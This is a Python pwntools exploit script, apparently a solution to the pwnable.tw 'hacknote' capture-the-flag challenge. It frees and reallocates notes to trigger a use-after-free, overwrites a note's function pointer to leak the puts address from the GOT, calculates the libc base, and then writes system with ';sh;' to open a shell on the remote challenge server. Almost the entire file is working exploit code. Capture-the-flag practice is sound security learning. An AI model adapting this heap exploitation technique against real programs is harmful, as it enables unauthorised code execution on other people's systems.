#!/usr/bin/env python3

from pwn import *

#libc = ELF("./libc-2.23.so")
libc = ELF("./libc_32.so.6")

#p = process("./hacknote_patched")
p = remote("chall.pwnable.tw", 10102)

def add_note(size, content):
    p.sendlineafter(b"choice :", b"1")
    p.sendlineafter(b"size :", str(size).encode())
    p.sendafter(b"Content :", content)

def delete_note(index):
    p.sendlineafter(b"choice :", b"2")
    p.sendlineafter(b"Index :", str(index).encode())

def print_note(index):
    p.sendlineafter(b"choice :", b"3")
    p.sendlineafter(b"Index :", str(index).encode())

# corrupt heap
add_note(32, b"A"*4)
add_note(32, b"B"*4)
delete_note(0)
delete_note(1)

# add evil note with print function and the
# puts GOT address
# binary is not PIE'd so no binary leaking needed
print_func = p32(0x0804862b)
puts_got = p32(0x0804a024)
add_note(8, print_func + puts_got )

# leak puts
print_note(0)
puts_leak = int.from_bytes(p.recv(4), 'little')
puts_local = libc.symbols["puts"]
log.info( f"[REMOTE PUTS() ADDRESS] {hex(puts_leak)}" )
log.info( f"[LOCAL  PUTS() ADDRESS] {hex(puts_local)}" )

# calculate libc base
libc.address = puts_leak - puts_local
log.info( f"[LIBC ADDRESS] {hex(libc.address)}" )


# create evil note armed to execute system('sh garbage;sh;')
log.info( f"[SYSTEM() ADDRESS] {hex(libc.symbols['system'])}" )
delete_note(2)
add_note(8, p32(libc.symbols["system"]) + b";sh;" )

# launch shell
print_note(0)

p.interactive()
